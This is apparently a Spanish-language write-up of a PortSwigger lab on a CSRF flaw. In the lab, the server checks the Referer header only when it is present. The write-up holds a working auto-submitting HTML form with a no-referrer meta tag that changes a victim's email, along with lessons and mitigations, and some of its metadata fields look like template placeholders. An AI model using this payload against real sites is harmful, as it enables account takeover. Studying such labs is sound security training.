---
title: "CSRF where Referer validation depends on header being present"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "csrf-where-referer-validation-depends-on-header-being-present"
author: "Z4k7"
date: "2026-04-11"
year: "2026"
status: "pwned"
tags:
  - "CSRF"
techniques:
  - "CSRF"
  - "Referer Bypass"
  - "Meta tag manipulation"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque CSRF donde la aplicación intenta bloquear solicitudes entre dominios usando validación de Referer, pero implementa un mecanismo de respaldo inseguro. El atacante puede eludir la validación usando una meta tag <meta name='referrer' content='no-referrer'> para omitir el encabezado Referer, permitiendo ejecutar un CSRF que cambia el email de la víctima desde un dominio diferente.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta bloquear las solicitudes entre dominios, pero tiene un mecanismo de respaldo inseguro.
          Para resolver el laboratorio, utiliza tu servidor de explotación para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del usuario.
          Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: `wiener:peter`

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/file-20260411225841994.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Accedemos en el apartado de login para ingresar con los datos suministrados en el objetivo del laboratorio:
      - kind: "image"
        src: "assets/images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/file-20260411225947744.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez estemos logiados en la web ya contamos con información del usuario actual en este caso podremos validar la siguiente información.
      - kind: "image"
        src: "assets/images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/file-20260411230026451.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Acceso a URL del laboratorio exitoso"
      - kind: "bullet"
        text: "Credenciales válidas: wiener:peter"
      - kind: "bullet"
        text: "Usuario autenticado con sesión activa"
      - kind: "bullet"
        text: "Acceso a sección de cambio de email"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab es diferente al anterior — hay una defensa (Referer validation) pero es incompleta. El servidor acepta solicitudes SIN Referer como respaldo. ¿Viste en BurpSuite que el header Referer está presente? Ese es el punto vulnerable — el servidor debería RECHAZAR solicitudes sin Referer, pero no lo hace."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Se emula el proceso de cambio de correo electrónico asociado al usuario actual con el fin de validar si es posible realizar dicha modificación y analizar las cabeceras que se envían durante la operación.
          Al enviar una solicitud al directorio `/my-account/change-email`, se obtiene como respuesta el contenido correspondiente a la petición de cambio, lo que permite evaluar el comportamiento del sistema y verificar posibles vulnerabilidades en el flujo de actualización de correo electrónico.
      - kind: "image"
        src: "assets/images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/file-20260411230109365.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultamos la solicitud que se envía:
      - kind: "code"
        lang: "JS"
        code: |
          POST /my-account/change-email HTTP/2
          Host: 0a8e00f4040fb8948087e9d400510097.web-security-academy.net
          Cookie: session=2FO7lgjkq8V9G1SpOYJDcb4d5D3KSgcB
          Content-Length: 23
          Cache-Control: max-age=0
          Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
          Sec-Ch-Ua-Mobile: ?0
          Sec-Ch-Ua-Platform: "Windows"
          Accept-Language: es-419,es;q=0.9
          Origin: https://0a8e00f4040fb8948087e9d400510097.web-security-academy.net
          Content-Type: application/x-www-form-urlencoded
          Upgrade-Insecure-Requests: 1
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
          Sec-Fetch-Site: same-origin
          Sec-Fetch-Mode: navigate
          Sec-Fetch-User: ?1
          Sec-Fetch-Dest: document
          Referer: https://0a8e00f4040fb8948087e9d400510097.web-security-academy.net/my-account?id=wiener
          Accept-Encoding: gzip, deflate, br
          Priority: u=0, i
          
          email=hack1%40gmail.com
      - kind: "note"
        text: |
          En el contenido de la solicitud podemos validar que contamos con una cabecera llamada `Referer` dicha cabecera nos menciona que solo se permite realizar cambio o solicitud desde el mismo dominio esto como alternativa de CSRF.
      - kind: "callout"
        type: "warning"
        label: "Validación Incompleta de Referer"
        text: "El servidor VALIDA que el Referer sea del mismo dominio — pero solo si está presente. Si podemos omitir el header Referer, la validación fallará y la solicitud será procesada sin verificación adicional. Este es el 'mecanismo de respaldo inseguro' mencionado en el objetivo."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La validación de Referer es MEJOR que nada, pero sigue siendo vulnerable si se puede omitir el header. En navegadores modernos, ciertos mecanismos pueden hacer esto — la meta tag `referrer` es uno de ellos. ¿Investigaste cómo los navegadores manejan diferentes valores de referrer policy?"

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Para saltar o evitar esta cabecera podríamos aplicar:
      - kind: "code"
        lang: "HTML"
        code: |
          <meta name="referrer" content="no-referrer">
      - kind: "note"
        text: |
          Al tratar de enviar el siguiente código nos permite saltar la restricción de la cabecera mencionada.
      - kind: "code"
        lang: "HTML"
        code: |
          <html>
          <head>
          <meta name="referrer" content="no-referrer">
          </head>
          <body>
          <h1>validacion</h1>
          <form class="login-form" name="change-email-form" action="https://0a8e00f4040fb8948087e9d400510097.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="hacker@htm.com"> 
          </form>
          <script> 
          	  document.forms[0].submit(); 
          </script>
          </body>
          </html>
      - kind: "note"
        text: |
          La meta tag `<meta name="referrer" content="no-referrer">` indica al navegador que NO envíe el header Referer en solicitudes. De esta forma:
          1. Cuando la víctima visita el servidor de explotación
          2. El formulario se auto-envía
          3. El navegador NO incluye el header Referer (porque la meta tag lo prohíbe)
          4. El servidor recibe una solicitud POST SIN Referer
          5. La validación de Referer falla (no hay Referer que validar)
          6. El servidor procesa la solicitud por defecto → Email cambiado ✅
      - kind: "callout"
        type: "info"
        label: "Anatomía del Bypass"
        text: "La vulnerabilidad está en la lógica del servidor: 'Si Referer es válido → procesar | Si Referer no está presente → procesar también'. Debería ser: 'Si Referer no es válido O no está presente → RECHAZAR'."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass es más sofisticado que el lab anterior. No es 'sin defensa', es 'defensa incompleta'. El servidor intentó protegerse pero cometió el error común de confiar en que el header Referer SIEMPRE estará presente. Los navegadores pueden controlarlo con políticas de referrer — aprende todas las variantes (no-referrer, same-origin, strict-origin-when-cross-origin, etc.)."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` en dicho apartado nos permite simular un servidor atacante.
      - kind: "image"
        src: "assets/images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/file-20260411231411984.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez se cargue el código arbitrario se guarda en el servidor y se envía a la víctima en este caso para confirmar que la víctima realizó dicho cambio validamos en el apartado de LOG para confirmar cambios en el servidor y la víctima.
      - kind: "image"
        src: "assets/images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/file-20260411231515950.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/file-20260411231531098.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El lab se completa cuando los logs del Exploit Server muestran que la víctima accedió a tu servidor y su email fue cambiado. En BurpSuite Academy, esto es el equivalente a una 'flag'."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab no aplica escalada de privilegios tradicional, pero sí demuestra una escalada funcional — el atacante puede cambiar el email de CUALQUIER usuario, no solo el suyo.
          En un escenario real, cambiar el email de un usuario administrativo o de alto privilegio es equivalente a:
      - kind: "bullet"
        text: "Tomar control de la cuenta"
      - kind: "bullet"
        text: "Acceder a datos sensibles"
      - kind: "bullet"
        text: "Ejecutar acciones en nombre de ese usuario"
      - kind: "bullet"
        text: "Escalar dentro de la organización"
      - kind: "note"
        text: |
          La diferencia con el lab anterior es que este tiene UNA DEFENSA intentada, pero mal implementada. Esto es más común en producción que "sin defensas".
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Muchos desarrolladores piensan que 'si no hay Referer, rechazar' es suficiente. Pero olvidan que pueden CONTROLAR el Referer usando meta tags o JavaScript. Esta mentalidad de 'defensa única' es el error. Las defensas en seguridad deben ser múltiples y redundantes."

lessons:
  - 'Validación de Referer es insuficiente si se puede omitir: Los navegadores permiten controlar si enviar o no el header Referer mediante meta tags.'
  - 'Defensa única = no es defensa: Confiar solo en Referer es débil. Debería haber CSRF tokens + Referer validation + SameSite.'
  - 'El "mecanismo de respaldo" debe ser seguro: Si la validación falla, el servidor debe RECHAZAR, no procesar.'
  - 'Meta tags de referrer policy son poderosas: Controlan qué información se envía en requests — los atacantes las usan constantemente.'
  - 'La diferencia entre "sin defensa" y "defensa incompleta": El lab anterior era trivial, este requiere entender cómo los navegadores manejan headers.'
  - 'BurpSuite es esencial para validar qué headers se envían: Ver exactamente qué ocurre es fundamental para identificar estos bypasses.'
mitigation:
  - 'Implementar CSRF tokens junto con Referer validation: No depender de una sola defensa.'
  - 'RECHAZAR solicitudes sin Referer en operaciones críticas: No procesarlas por defecto.'
  - 'Usar SameSite cookies (Strict o Lax): Limita cuándo se envían cookies en requests cross-site.'
  - 'Validar Origin header además de Referer: El header Origin es más difícil de omitir que Referer.'
  - 'Implementar confirmación adicional para cambios de email: Enviar correo de confirmación al email antiguo ANTES de cambiar.'
  - 'Loguear y monitorear cambios de email: Detectar patrones anómalos (múltiples cambios en poco tiempo).'
  - 'Usar políticas de Content Security Policy (CSP): Para prevenir inyecciones que modifiquen meta tags.'
---
